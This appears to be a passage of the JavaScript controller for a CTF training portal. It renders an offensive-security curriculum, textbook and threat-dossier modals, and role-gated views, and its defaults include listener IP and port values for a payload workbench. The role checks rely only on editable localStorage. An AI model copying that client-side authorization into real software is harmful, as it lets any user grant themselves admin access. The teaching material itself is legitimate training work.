/* ============================================================
 * CTF Atlas — portal.js  v3.0
 * Curriculum Renderer & Portal Controller
 * Loads data/live-intel.json, renders six advanced curriculum
 * modules with terminal labs, and keeps all existing views.
 * ============================================================ */

/* ── Active Session & Security Clearance ─────────────────── */
const activeSession = window.ATLAS_USER || {
  uid: localStorage.getItem('atlas-uid') || 'cadet',
  role: localStorage.getItem('atlas-role') || 'cadet'
};

/* ── Core application state ──────────────────────────────── */
const state = {
  view: 'dashboard',
  userUid: activeSession.uid || 'cadet',
  userRole: activeSession.role || 'cadet',
  domain: null,
  os: localStorage.getItem('atlas-os') || 'linux',
  solved: JSON.parse(localStorage.getItem('atlas-solved') || '[]'),
  completedDomains: JSON.parse(localStorage.getItem('atlas-domains') || '[]'),
  theme: localStorage.getItem('atlas-theme') || 'dark',
  moduleQuery: localStorage.getItem('atlas-module-query') || '',
  curriculumModule: null,
  toolTab: 'overview',
  playbookTab: 'universal',
  casebookTab: 'all',
  casebookQuery: '',
  hackquestSeasonFilter: 'all',
  hackquestRoundFilter: 'all',
  tricksTab: 'all',
  tricksQuery: '',
  intelTab: 'all',
  intelQuery: '',
  workbenchTab: 'encoder',
  workbenchLhost: '10.10.14.42',
  workbenchLport: '4444',
  workbenchSubnetIp: '10.10.14.23',
  workbenchSubnetPrefix: '24',
};

window.state = state;

function isAdvancedRole() {
  return state.userRole === 'admin';
}

// Global alert safety: for cadet profile, any alert that arises says 'This field is under development.'
if (!isAdvancedRole() && typeof window !== 'undefined') {
  const _rawAlert = window.alert;
  window.alert = function(_msg) {
    if (typeof _rawAlert === 'function') {
      _rawAlert('This field is under development.');
    }
  };
}

function hasViewAccess(view) {
  if (isAdvancedRole()) return true;
  // Restricted views for cadet/normal user:
  if (view === 'tools' || view === 'playbook') return false;
  return true;
}

function updateNavForRole() {
  const isCadet = !isAdvancedRole();
  const mainNav = document.querySelector('.main-nav');
  if (mainNav) {
    const toolsBtn = mainNav.querySelector('[data-view="tools"]');
    const playbookBtn = mainNav.querySelector('[data-view="playbook"]');
    if (isCadet) {
      if (toolsBtn) toolsBtn.remove();
      if (playbookBtn) playbookBtn.remove();
    }
    // Renumber visible buttons sequentially from 01:
    const visibleButtons = mainNav.querySelectorAll('.nav-item');
    visibleButtons.forEach((btn, idx) => {
      const span = btn.querySelector('span');
      if (span) {
        span.textContent = String(idx + 1).padStart(2, '0');
      }
    });
  }

  const badgeContainer = document.getElementById('userProfileBadge');
  if (badgeContainer) {
    badgeContainer.innerHTML = `
      <div class="user-badge ${isCadet ? 'cadet' : 'admin'}">
        <div>
          <strong style="color:${isCadet ? 'var(--cyan)' : 'var(--green)'};display:flex;align-items:center;gap:4px">
            ${isCadet ? '🛡️' : '⚡'} RANGE OPERATOR
          </strong>
          <p style="margin:2px 0 0;font-size:10px;color:#aeb6c5">NODE: <code>${esc(state.userUid)}</code></p>
        </div>
        <span class="tag accent" style="font-size:9px;padding:2px 6px">ACTIVE</span>
      </div>`;
  }

  const topbarPill = document.getElementById('topbarUserPill');
  if (topbarPill) {
    topbarPill.innerHTML = `<span class="tag accent" style="margin-right:8px;font-size:10px;display:inline-flex;align-items:center;gap:4px">● ${esc(state.userUid)}</span>`;
  }
}

let intelCache = null;
let intelLoading = false;

/* ── Escape helper ───────────────────────────────────────── */
function esc(s) {
  return String(s ?? '').replace(/[&<>'"]/g, c =>
    ({ '&':'&amp;','<':'&lt;','>':'&gt;',"'":"&#39;",'"':'&quot;' }[c]));
}

/* ── Chapter Mapping & Textbook Modal Helpers ────────────── */
function getChapterForConcept(domainId, conceptIndex, conceptTitle) {
  const map = {
    'foundations': 'foundations-threat-model',
    'linux': (conceptIndex === 4) ? 'linux-mastery-privesc' : ((conceptIndex === 2 || conceptIndex === 5) ? 'linux-pipelines' : (conceptIndex === 3 ? 'linux-proc-ipc' : 'linux-vfs')),
    'networking': (conceptIndex === 3) ? 'networking-dns' : ((conceptIndex === 4 || conceptIndex === 5) ? 'networking-nmap' : 'networking-tcp'),
    'web': (conceptIndex === 1) ? 'web-start-to-end' : ((conceptIndex === 2 || conceptIndex === 5) ? 'web-auth-jwt' : (conceptIndex === 4 ? 'web-xss-csp' : 'web-sqli-ast')),
    'crypto': (conceptIndex === 1 || conceptIndex === 2) ? 'crypto-classical' : (conceptIndex === 4 ? 'crypto-rsa' : 'crypto-aes'),
    'forensics': (conceptIndex === 4) ? 'forensics-pcap' : ((conceptIndex === 3 || conceptIndex === 5) ? 'forensics-volatility' : 'forensics-disk-fs'),
    'reverse': (conceptIndex === 1 || conceptIndex === 5) ? 'reverse-start-to-end' : ((conceptIndex === 2 || conceptIndex === 4) ? 'reverse-x86-asm' : (conceptIndex === 3 ? 'reverse-anti-debug' : 'reverse-ghidra')),
    'pwn': (conceptIndex === 1 || conceptIndex === 3) ? 'pwn-start-to-end' : ((conceptIndex === 4 || conceptIndex === 5) ? 'pwn-fmtstr' : (conceptIndex === 2 ? 'pwn-heap' : 'pwn-rop')),
    'osint': 'osint-recon',
    'stego': 'stego-deep',
    'mobile-cloud': (conceptIndex >= 4) ? 'cloud-k8s-iam' : 'cloud-docker-escape',
    'blue-team': 'blue-team-telemetry'
  };
  return map[domainId] || 'foundations-threat-model';
}

function openTextbookModal(chapterId) {
  if (!isAdvancedRole() && (chapterId.startsWith('reverse-') || chapterId.startsWith('pwn-'))) {
    alert('This field is under development.');
    return;
  }
  const chapters = window.TEXTBOOK_CHAPTERS || {};
  const ch = chapters[chapterId];
  const modalBackdrop = document.getElementById('modalBackdrop');
  const modal = modalBackdrop?.querySelector('.modal');
  const modalTitle = document.getElementById('modalTitle');
  const modalBody = document.getElementById('modalBody');

  if (!modalBackdrop || !modalBody || !modalTitle) return;

  if (!ch) {
    modalTitle.textContent = 'CHAPTER NOT FOUND';
    modalBody.innerHTML = `<div class="empty">Chapter "${esc(chapterId)}" is not currently indexed in the knowledge vault.</div>`;
    modalBackdrop.hidden = false;
    return;
  }

  modal.classList.add('wide');
  modalTitle.innerHTML = `📖 ${esc(ch.title)}`;

  let theoryHTML = '';
  if (ch.theory) {
    if (ch.theory.sections && Array.isArray(ch.theory.sections)) {
      theoryHTML = ch.theory.sections.map(s => `
        <div style="margin-bottom:24px">
          <h4 style="font-family:var(--display);color:var(--cyan);letter-spacing:.08em;text-transform:uppercase;font-size:14px;margin-bottom:8px">${esc(s.heading)}</h4>
          <p style="color:#cbd5e1;line-height:1.8;margin-bottom:10px">${esc(s.body).replace(/\n/g, '<br>')}</p>
          ${s.code ? `<pre class="code-block" style="background:#090d16;padding:12px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto"><code style="color:#00ff88;font-size:12px;font-family:var(--mono)">${esc(s.code)}</code></pre>` : ''}
        </div>
      `).join('');
    } else if (typeof ch.theory === 'string') {
      const paras = ch.theory.split('\n\n');
      theoryHTML = paras.map(p => {
        const trimmed = p.trim();
        if (!trimmed) return '';
        if (trimmed.startsWith('# ') || trimmed.startsWith('## ') || trimmed.startsWith('### ')) {
          const heading = trimmed.replace(/^#+\s*/, '');
          return `<h4 style="font-family:var(--display);color:var(--cyan);letter-spacing:.08em;text-transform:uppercase;font-size:14px;margin:20px 0 8px">${esc(heading)}</h4>`;
        }
        if (trimmed.endsWith(':') && trimmed.length < 80 && !trimmed.includes('\n')) {
          return `<h4 style="font-family:var(--display);color:var(--cyan);letter-spacing:.08em;font-size:13px;margin:18px 0 6px">${esc(trimmed)}</h4>`;
        }
        return `<p style="color:#cbd5e1;line-height:1.8;margin-bottom:12px">${esc(trimmed).replace(/\n/g, '<br>')}</p>`;
      }).join('');
    }
  }

  let tableHTML = '';
  const cmdList = ch.commands || [];
  if (cmdList.length) {
    tableHTML = `
      <div class="section-head" style="margin-top:24px">
        <div>
          <div class="eyebrow">COMMAND DICTIONARY // IN-DEPTH REFERENCE</div>
          <h3 style="font-family:var(--display);margin:0;color:var(--green)">Master Command Reference Table</h3>
        </div>
      </div>
      <div class="cmd-table-wrap">
        <table class="cmd-table">
          <thead>
            <tr>
              <th style="width:26%">Command / Flag / Payload</th>
              <th style="width:18%">Why We Use It</th>
              <th style="width:18%">When to Use</th>
              <th style="width:22%">Under-the-Hood Internals</th>
              <th style="width:16%">Common Pitfalls</th>
            </tr>
          </thead>
          <tbody>
            ${cmdList.map(cmd => {
              const cmdName = cmd.cmd || cmd.command || cmd.flag || cmd.name || '';
              return `
                <tr>
                  <td><code style="word-break:break-all;color:var(--green);font-size:12px;background:#0d1522;padding:2px 6px;border-radius:3px">${esc(cmdName)}</code></td>
                  <td style="color:#cbd5e1">${esc(cmd.why || cmd.description || '')}</td>
                  <td style="color:#aeb6c5">${esc(cmd.when || cmd.context || '')}</td>
                  <td style="color:#94a3b8;font-size:11px">${esc(cmd.internals || 'N/A')}</td>
                  <td style="color:#f87171;font-size:11px">${esc(cmd.pitfalls || 'None noted')}</td>
                </tr>
              `;
            }).join('')}
          </tbody>
        </table>
      </div>
    `;
  }

  let workflowsHTML = '';
  const wf = ch.cli_vs_gui || ch.workflows;
  if (wf) {
    const cliText = wf.cli_workflow || wf.cli || '';
    const guiText = wf.gui_workflow || wf.gui || '';
    const speedText = wf.speed_tip || wf.speed_tips || '';
    workflowsHTML = `
      <div class="section-head" style="margin-top:24px">
        <div>
          <div class="eyebrow">VELOCITY WORKFLOW // SPEED GUIDE</div>
          <h3 style="font-family:var(--display);margin:0;color:var(--cyan)">CLI vs GUI Operation &amp; Speed Tips</h3>
        </div>
      </div>
      <div class="wf-box">
        <div class="wf-pane">
          <h4>🖥️ CLI Workflow</h4>
          <p style="color:#cbd5e1;font-size:13px;line-height:1.7">${esc(cliText)}</p>
        </div>
        <div class="wf-pane">
          <h4>🖱️ GUI Workflow</h4>
          <p style="color:#cbd5e1;font-size:13px;line-height:1.7">${esc(guiText)}</p>
        </div>
      </div>
      ${speedText ? `
        <div class="note" style="border-left:3px solid var(--green);margin-top:12px">
          <strong style="color:var(--green);font-family:var(--display)">⚡ TOURNAMENT SPEED TIPS:</strong>
          <p style="margin-top:6px;color:#e2e8f0;line-height:1.7">${esc(speedText)}</p>
        </div>
      ` : ''}
    `;
  }

  let checklistHTML = '';
  const triageList = ch.triage_workflow || ch.triage_checklist || [];
  if (triageList && triageList.length) {
    checklistHTML = `
      <div class="section-head" style="margin-top:24px">
        <div>
          <div class="eyebrow">TRIAGE METHODOLOGY // STEP-BY-STEP CHECKLIST</div>
          <h3 style="font-family:var(--display);margin:0;color:var(--amber)">Solve &amp; Triage Checklist</h3>
        </div>
      </div>
      <div class="detail" style="padding:18px">
        <ul class="checklist">
          ${triageList.map(item => `<li>${esc(item)}</li>`).join('')}
        </ul>
      </div>
    `;
  }

  let writeupHTML = '';
  if (ch.writeup) {
    const w = ch.writeup;
    writeupHTML = `
      <div class="section-head" style="margin-top:24px">
        <div>
          <div class="eyebrow">WORKED CTF TOURNAMENT CASE STUDY</div>
          <h3 style="font-family:var(--display);margin:0;color:var(--pink)">${esc(w.challenge_name || 'Tournament Challenge')} [${esc(w.ctf_event || 'Global CTF')}]</h3>
        </div>
      </div>
      <div class="detail" style="padding:20px;border-left:3px solid var(--pink)">
        ${w.scenario ? `<p style="color:#e2e8f0;line-height:1.7;margin-bottom:14px"><strong>Challenge Scenario:</strong> ${esc(w.scenario)}</p>` : ''}
        ${w.solve_steps && w.solve_steps.length ? `
          <h5 style="color:var(--cyan);font-family:var(--display);margin:14px 0 8px;font-size:13px;letter-spacing:.06em">STEP-BY-STEP EXPLOITATION METHODOLOGY:</h5>
          <ol style="color:#cbd5e1;line-height:1.8;padding-left:20px;margin-bottom:14px">
            ${w.solve_steps.map(s => `<li>${esc(s)}</li>`).join('')}
          </ol>
        ` : ''}
        ${w.exploit_code ? `
          <div style="display:flex;justify-content:space-between;align-items:center;margin:14px 0 6px">
            <h5 style="color:var(--green);font-family:var(--display);margin:0;font-size:13px;letter-spacing:.06em">RUNNABLE PYTHON SOLVER SCRIPT:</h5>
          </div>
          <pre class="code-block" style="background:#090d16;padding:14px;border:1px solid #1e293b;border-radius:4px;overflow-x:auto;max-height:400px"><code style="color:#00ff88;font-size:12px;font-family:var(--mono);white-space:pre">${esc(w.exploit_code)}</code></pre>
        ` : ''}
      </div>
    `;
  }

  const diagram = ch.diagram || ch.architecture_diagram;

  modalBody.innerHTML = `
    <div style="margin-bottom:16px">
      <div class="tag-row" style="margin-bottom:10px">
        <span class="tag accent">${esc(ch.domain || 'Core')}</span>
        <span class="tag success">${esc(ch.reading_time || '15 min read')}</span>
        <span class="tag">Textbook Chapter</span>
      </div>
      <h3 style="font-family:var(--display);font-size:22px;color:var(--fg);margin:0 0 6px">${esc(ch.title)}</h3>
      <p style="color:var(--muted-fg);font-size:13px;margin:0 0 16px">${esc(ch.subtitle || '')}</p>
    </div>

    ${diagram ? `
      <div style="margin-bottom:20px">
        <span style="font-size:11px;color:var(--cyan);text-transform:uppercase;letter-spacing:.14em;font-weight:bold">// Architectural State Diagram</span>
        <pre class="textbook-diagram"><code>${esc(diagram)}</code></pre>
      </div>
    ` : ''}

    <div class="section-head" style="margin-top:20px">
      <div>
        <div class="eyebrow">SECTION 01 // FOUNDATIONAL THEORY</div>
        <h3 style="font-family:var(--display);margin:0;color:var(--cyan)">${esc((ch.theory && ch.theory.title) || ch.category || 'In-Depth Theory')}</h3>
      </div>
    </div>
    <div class="detail" style="padding:22px">
      ${theoryHTML}
    </div>

    ${tableHTML}
    ${workflowsHTML}
    ${checklistHTML}
    ${writeupHTML}

    <div style="margin-top:24px;text-align:right">
      <button class="btn" id="closeModalBtn">Close Chapter [X]</button>
    </div>
  `;

  modalBackdrop.hidden = false;
  document.body.style.overflow = 'hidden';

  document.getElementById('closeModalBtn')?.addEventListener('click', closeModal);
}

function closeModal() {
  const modalBackdrop = document.getElementById('modalBackdrop');
  if (modalBackdrop) modalBackdrop.hidden = true;
  document.body.style.overflow = '';
}
window.openTextbookModal = openTextbookModal;
window.closeModal = closeModal;

function openIntelModal(itemId) {
  const modalBackdrop = document.getElementById('modalBackdrop');
  const modal = modalBackdrop?.querySelector('.modal');
  const modalTitle = document.getElementById('modalTitle');
  const modalBody = document.getElementById('modalBody');
  if (!modalBackdrop || !modalBody || !modalTitle) return;

  const items = (intelCache && intelCache.items) || [];
  const it = items.find(x => x.id === itemId);

  if (!it) {
    modalTitle.textContent = 'THREAT DOSSIER NOT FOUND';
    modalBody.innerHTML = `<div class="empty">Signal ID "${esc(itemId)}" was not found in the intelligence cache.</div>`;
    modalBackdrop.hidden = false;
    return;
  }

  modal.classList.add('wide');
  modalTitle.innerHTML = `🛡️ THREAT DOSSIER // ${esc(it.cve || it.id)}`;

  const kind = it.kind || 'SIGNAL';
  const cve = it.cve || it.id;
  const product = it.product || 'Target Asset';
  const severity = it.severity || 'high';
  const topic = it.topic || 'Web / Systems';
  const pubDate = it.date ? new Date(it.date).toUTCString() : 'Active Threat Signal';

  const details = it.details || {};
  const rootCause = details.rootCause || `${product} suffers from an unauthenticated parser or memory boundary validation failure within ${topic}. Attackers can transmit crafted input payloads that violate memory safety, execute arbitrary command sequences, or bypass authentication controls.`;
  const attackVector = details.attackVector || `Network vector: Crafted TCP/HTTP packet or API request payload delivered to the affected service. The vulnerability requires no prior authentication and triggers immediate state corruption or code execution.`;
  const mitreTechniques = (details.mitre && details.mitre.length) ? details.mitre : [
    'T1190 - Exploit Public-Facing Application',
    'T1059 - Command and Scripting Interpreter',
    'T1068 - Exploitation for Privilege Escalation'
  ];
  const takeaways = (details.takeaways && details.takeaways.length) ? details.takeaways : [
    'Examine protocol boundary transitions and untrusted input paths across disparate parsers.',
    'Test for parser differentials where reverse proxies and backend daemons normalize characters inconsistently.',
    'In CTF competitions, inspect service banners and software versions against published CVE registries.'
  ];
  const remediation = details.remediation || `Upgrade affected software to the vendor-patched release immediately. In the interim, apply strict network perimeter ingress filtering, deploy WAF rules blocking anomalous headers/traversal sequences, and monitor for unexpected child process spawning.`;

  modalBody.innerHTML = `
    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border)">
      <div class="tag-row">
        <span class="tag ${kind === 'KEV' ? 'warn' : kind === 'CVE' ? 'accent' : 'success'}">${esc(kind)}</span>
        <span class="tag warn">${esc(severity.toUpperCase())}</span>
        <span class="tag">${esc(topic)}</span>
        ${it.cve ? `<span class="tag accent">${esc(it.cve)}</span>` : ''}
      </div>
      <div style="font-size:12px;color:var(--muted)">Published: <strong>${esc(pubDate)}</strong></div>
    </div>

    <h3 style="font-size:20px;color:var(--fg);margin:0 0 10px">${esc(it.title)}</h3>
    <p style="color:#cbd5e1;line-height:1.7;font-size:14px;margin-bottom:18px">${esc(it.summary || '')}</p>

    <div class="note" style="border-left-color:var(--amber);margin-bottom:18px">
      <h4 style="font-family:var(--display);color:var(--amber);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🔬 Vulnerability Anatomy &amp; Root Cause</h4>
      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(rootCause)}</p>
    </div>

    <div style="margin-bottom:18px">
      <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">⚔️ Attack Mechanics &amp; Weaponization Vector</h4>
      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(attackVector)}</p>
    </div>

    <div style="margin-bottom:18px">
      <h4 style="font-family:var(--display);color:var(--cyan);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🎯 MITRE ATT&amp;CK Matrix Mapping</h4>
      <div class="tag-row" style="margin-top:6px">
        ${mitreTechniques.map(m => `<span class="tag accent" style="padding:4px 10px;font-family:var(--mono)">${esc(m)}</span>`).join('')}
      </div>
    </div>

    <div style="margin-bottom:18px">
      <h4 style="font-family:var(--display);color:var(--green);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🎓 CTF &amp; Ethical Hacker Takeaways</h4>
      <ul style="color:#cbd5e1;padding-left:20px;line-height:1.8;margin:0">
        ${takeaways.map(t => `<li>${esc(t)}</li>`).join('')}
      </ul>
    </div>

    <div class="note warn-note" style="margin-bottom:18px">
      <h4 style="font-family:var(--display);color:var(--pink);font-size:12px;letter-spacing:.08em;text-transform:uppercase;margin:0 0 6px">🛡️ Blue Team Detection &amp; Production Remediation</h4>
      <p style="color:#cbd5e1;line-height:1.7;margin:0">${esc(remediation)}</p>
    </div>

    <div style="display:flex;justify-content:space-between;align-items:center;margin-top:20px;padding-top:14px;border-top:1px solid var(--border)">
      <div>
        ${it.sourceUrl ? `<a href="${esc(it.sourceUrl)}" target="_blank" rel="noopener" class="btn outline" style="font-size:11px">Official Source Advisory →</a>` : ''}
      </div>
      <button class="btn" id="closeIntelModalBtn">Close Dossier [X]</button>
    </div>
  `;

  modalBackdrop.hidden = false;
  document.body.style.overflow = 'hidden';
  document.getElementById('closeIntelModalBtn')?.addEventListener('click', closeModal);
}
window.openIntelModal = openIntelModal;


/* ── Existing domain & tool datasets (preserved) ────────── */
const domains = [
  {id:'foundations',icon:'01',name:'Foundations',level:'Start here',duration:'6–10 h',summary:'What CTFs are, threat modeling, flags, trust boundaries, internet basics, ethics, and a repeatable solve loop.',
   concepts:[
    ['CTF anatomy','Challenges are small, observable systems with an objective. A strong solver moves through hypothesis → experiment → evidence → validation instead of guessing.','Recognize category clues. Keep a scratchpad. Record commands, assumptions and output.'],
    ['CIA + security properties','Confidentiality, integrity and availability are useful lenses, but CTFs also test authenticity, authorization, isolation and provenance.','Map each clue to what property is being broken or proven.'],
    ['Trust boundaries','A browser, API, database, process, file parser and kernel are separate trust zones. Vulnerabilities often occur where data crosses between them.','Draw a 4-box data-flow diagram before touching a hard web or pwn problem.'],
    ['Evidence discipline','A finding is not "real" because a tool says so. Reproduce it, minimize it, explain why it happens and identify the security impact.','Capture input → transformation → output. Prefer small test cases.'],
    ['Legal sandboxing','Use local intentionally vulnerable apps, CTF infrastructure and systems you are explicitly authorized to test.','Keep practice targets on loopback/host-only networks when possible.']
   ],practice:['Do the browser challenge "Find the flag," then write a 5-line solve note.','Complete OverTheWire Bandit Level 0–5.','Build a local folder: notes/, evidence/, scripts/, samples/.']},
  {id:'linux',icon:'02',name:'Linux + CLI',level:'Core',duration:'8–14 h',summary:'Shell fluency, processes, files, permissions, pipes, text processing, networking utilities and automation.',
   concepts:[
    ['Filesystem model','Paths, inodes, links, permissions, ownership, mount points and special files explain most beginner Linux CTF tasks.','Learn ls/stat/find/file/strings/xargs. Understand absolute vs relative paths.'],
    ['Pipelines','Small programs become a forensic toolkit when composed with pipes and redirection.','Think producer → filter → reducer. Examples: grep → cut → sort → uniq.'],
    ['Processes','PID, parent/child relationships, environment variables, file descriptors and signals explain how processes interact.','Inspect with ps, /proc, lsof, pgrep and command-line flags.'],
    ['Permissions','Read/write/execute differ for owner/group/other; special bits and ACLs add complexity.','Practice chmod/chown and reason from symbolic and numeric forms.'],
    ['Text as data','Logs and protocol transcripts are often solved by transforming text, not writing a large program.','Use awk/sed/grep, Python one-liners, jq and regex carefully.']
   ],practice:['Bandit or pwn.college Linux modules.','Recreate a log-triage pipeline from the playbook.','Solve browser labs on permissions and process reasoning.']},
  {id:'networking',icon:'03',name:'Networking',level:'Core',duration:'10–16 h',summary:'Ethernet, IP, TCP/UDP, DNS, HTTP, TLS, sockets, packet capture, scanning and service fingerprinting.',
   concepts:[
    ['Packets + layers','A packet is a structured byte sequence moving through protocols. CTFs often reward knowing which layer owns the clue.','Practice identifying MAC/IP/port/protocol from packet snippets.'],
    ['TCP state','SYN, SYN-ACK, ACK, sequence numbers, retransmission and connection lifecycle explain port scanning and capture artifacts.','Use Wireshark display filters and tcpdump on your own captures.'],
    ['DNS','Name resolution is a protocol and a data source. A record type can change the investigative path.','Learn A/AAAA/CNAME/MX/TXT/NS and dig.'],
    ['HTTP','Methods, paths, headers, cookies, content types, caching and status codes form the language of web CTFs.','Inspect requests manually with browser devtools or Burp.'],
    ['Scanning methodology','Discovery answers "what exists"; enumeration answers "what is there to interact with"; validation answers "is the finding real?"','Prefer targeted, rate-aware scans on authorized lab targets.']
   ],practice:['Run Nmap against 127.0.0.1 only and inspect localhost services.','Load a sample PCAP in Wireshark and reconstruct an HTTP exchange.','Use curl to compare headers across two local endpoints.']},
  {id:'web',icon:'04',name:'Web + APIs',level:'Core',duration:'16–24 h',summary:'Requests, sessions, authentication, access control, injections, client-side behavior, APIs and browser trust boundaries.',
   concepts:[
    ['Request anatomy','Method, target, headers, cookies, body, encoding and response metadata define the web transaction.','Learn to redraw any request in 6 fields.'],
    ['Authentication vs authorization','Authentication asks "who are you?" Authorization asks "may you do this?" Many real-world bugs live in the second question.','Create an identity/role matrix and test object-level access in a lab.'],
    ['Input handling','Injection occurs when data is interpreted as code or syntax in another language. Encodings can hide the true value from casual inspection.','Trace the data through parser boundaries before choosing a payload.'],
    ['Client-side security','DOM, browser APIs, storage, CORS and prototype behavior can shift the trust boundary into the browser.','Use devtools Sources/Network/Application panels.'],
    ['APIs','JSON, REST, GraphQL, JWTs and rate limits expose application logic in a machine-friendly form.','Map endpoints, inputs, auth requirements and object identifiers.']
   ],practice:['PortSwigger learning paths + labs.','Local OWASP Juice Shop with the tutorial mode.','Build an API request worksheet and fill it for a local training target.']},
  {id:'crypto',icon:'05',name:'Cryptography',level:'Core',duration:'12–20 h',summary:'Encodings, XOR, modular arithmetic, hashes, MACs, symmetric/asymmetric crypto and common CTF failure patterns.',
   concepts:[
    ['Encoding ≠ encryption','Base64, hex, URL encoding and ASCII are representations. They do not provide secrecy.','Try decoding before reaching for cryptanalysis.'],
    ['XOR','XOR is reversible and appears in stream ciphers and simple CTF puzzles. Multi-byte reasoning often depends on key repetition.','Practice truth tables, bytes, hex and XOR identities.'],
    ['Hashes','Cryptographic hashes map arbitrary input to a fixed digest. They are designed to resist specific attack classes—not to be reversible like encryption.','Recognize common digest formats, salts and why "hash = encryption" is wrong.'],
    ['Public-key crypto','RSA, ECC and key agreement rely on mathematical structure. CTFs often expose textbook or flawed parameters rather than breaking sound primitives.','Learn modular arithmetic, inverses and why parameter choices matter.'],
    ['Protocol failures','Most practical crypto weaknesses come from misuse: nonce reuse, weak randomness, missing authentication, poor key handling or unsafe composition.','Ask "what assumption failed?" before attempting brute force.']
   ],practice:['CryptoHack introductory/general challenges.','Implement Base64, Caesar, XOR and modular inverse in Python.','Write a one-page "crypto smell" checklist.']},
  {id:'forensics',icon:'06',name:'Forensics',level:'Core',duration:'10–18 h',summary:'Files, metadata, archives, logs, memory concepts, timelines, packet captures and evidence handling.',
   concepts:[
    ['File signatures','Extensions lie; magic bytes, headers and parsers reveal actual file types.','Use file, xxd/hexdump, strings and binwalk in local samples.'],
    ['Metadata','Timestamps, EXIF-like fields, document properties and filesystem metadata provide context but may be edited.','Treat metadata as a clue, not proof.'],
    ['Logs + timelines','Correlate timestamps across sources; account for timezone, clock skew and log rotation.','Normalize time to UTC in notes and preserve raw values.'],
    ['PCAP analysis','Capture files can answer who talked to whom, when, over which protocol, and what content crossed the wire.','Filter narrowly, then broaden; reconstruct the conversation.'],
    ['Memory concepts','Process state, mappings, handles and strings may survive in memory after they disappear from disk.','Learn conceptual memory layout before using a full memory framework.']
   ],practice:['Use the browser packet/log labs.','Open Wireshark\'s User Guide alongside a sample capture.','Build a timeline from three synthetic log sources.']},
  {id:'reverse',icon:'07',name:'Reverse Engineering',level:'Advanced',duration:'16–28 h',summary:'Executable formats, control flow, disassembly, decompilation, strings, symbols, calling conventions and patch reasoning.',
   concepts:[
    ['ELF/PE basics','Executables contain headers, sections/segments, imports/exports, symbols and relocation data.','Learn the difference between what the file declares and what the loader creates.'],
    ['Assembly reading','Recognize function prologues, branches, calls, returns, comparisons, memory access and register conventions.','Track data flow instead of translating every instruction word-for-word.'],
    ['Static vs dynamic analysis','Static analysis asks what the program could do; dynamic analysis observes what it does with a chosen input/state.','Use static first, then instrument targeted functions.'],
    ['Control flow','Branches and call graphs reveal validation logic, parser boundaries and hidden states.','Mark the "gate" that decides success/failure.'],
    ['Ghidra workflow','Import → analyze → locate interesting functions/strings → rename → decompile → confirm with disassembly.','Keep hypotheses in comments and verify by tracing callers.']
   ],practice:['Open the Ghidra docs and a tiny local binary you wrote yourself.','Use Linux Insides + Beej C as prerequisites.','Solve the browser "reverse the logic" lab.']},
  {id:'pwn',icon:'08',name:'Binary Exploitation',level:'Advanced',duration:'18–32 h',summary:'Memory safety, stack frames, calling conventions, mitigations, debugging and exploit-development concepts—inside local CTF binaries.',
   concepts:[
    ['Memory model','Stack, heap, data, code and shared libraries occupy different regions with different purposes and protections.','Draw a process address-space map before writing exploit code.'],
    ['Memory corruption','Out-of-bounds reads/writes and lifetime bugs can change data or control flow.','Start from root cause and exact bytes in memory, not from a payload recipe.'],
    ['Mitigations','NX, ASLR, PIE, stack canaries, RELRO and CFI change what is feasible.','Learn what each mitigation protects and what assumptions remain.'],
    ['Debugging','A debugger turns "crash" into evidence: registers, stack, memory, call stack and instruction pointer.','Use breakpoints and watchpoints in local programs you own.'],
    ['pwntools mindset','Automate repetitive interaction and packing/parsing after you understand the target.','Use scripts as executable lab notes, not magic incantations.']
   ],practice:['pwn.college core material.','Write a tiny vulnerable C program locally and inspect it with a debugger.','Use pwntools docs for packing/unpacking and process interaction in local labs.']},
  {id:'osint',icon:'09',name:'OSINT + Research',level:'Core',duration:'8–14 h',summary:'Source validation, metadata, public data correlation, search operators, timelines and uncertainty management.',
   concepts:[
    ['Source quality','A source can be primary, secondary, anonymous, copied, stale or manipulated. Record provenance.','Prefer primary documents; corroborate important claims.'],
    ['Pivoting','Each artifact creates another search dimension: name, domain, username, timestamp, identifier, hash or location.','Pivot one variable at a time and record why it is useful.'],
    ['Geolocation','Buildings, shadows, road signs, terrain, metadata and map context can converge on a location.','Separate observation from inference.'],
    ['Timeline reasoning','Public artifacts often gain value when ordered in time.','Use exact timestamps where available and label uncertainty.'],
    ['OPSEC','OSINT research can leak your own identity and intent.','Use safe accounts, read-only access and respect site policies.']
   ],practice:['Solve a synthetic source-correlation case in the challenge set.','Make a provenance table with source, claim, date and confidence.']},
  {id:'stego',icon:'10',name:'Steganography',level:'Core',duration:'6–10 h',summary:'Hidden data in images, audio, text and file structure; distinguish stego from ordinary encoding.',
   concepts:[
    ['Container inspection','The first move is often file type, dimensions, metadata and trailing data.','Compare declared size vs actual size.'],
    ['Image planes','LSB-like techniques modify low-significance bits; visual inspection may not reveal changes.','Understand channels, bit depth and pixel ordering.'],
    ['Text stego','Whitespace, capitalization, Unicode confusables and formatting can encode data.','Normalize carefully, but preserve a raw copy.'],
    ['Audio stego','Spectral or sample-level patterns can encode hidden data.','Know that "listen to it" is only one view.'],
    ['Tool discipline','A stego tool is a hypothesis engine, not an oracle.','Check outputs against the original artifact and expected structure.']
   ],practice:['Use strings/binwalk/hexdump on local synthetic files.','Create your own whitespace-encoded message and decode it.']},
  {id:'mobile-cloud',icon:'11',name:'Mobile + Cloud + Containers',level:'Advanced',duration:'14–22 h',summary:'Android packages, app storage, tokens, cloud identity, container boundaries and modern deployment surfaces.',
   concepts:[
    ['Mobile package anatomy','APK/IPA packages contain manifests, resources, code and configuration.','Start with metadata, permissions and embedded endpoints.'],
    ['Cloud identity','Modern systems depend heavily on machine identities, roles and scoped permissions.','Map identities to resources and actions.'],
    ['Container model','Containers isolate processes, not the whole machine. Images, layers, capabilities, mounts and networks matter.','Learn image inspection and least-privilege concepts.'],
    ['Secrets in builds','Tokens and keys can leak into source, images, logs or client bundles.','Treat exposed secrets as sensitive even in labs.'],
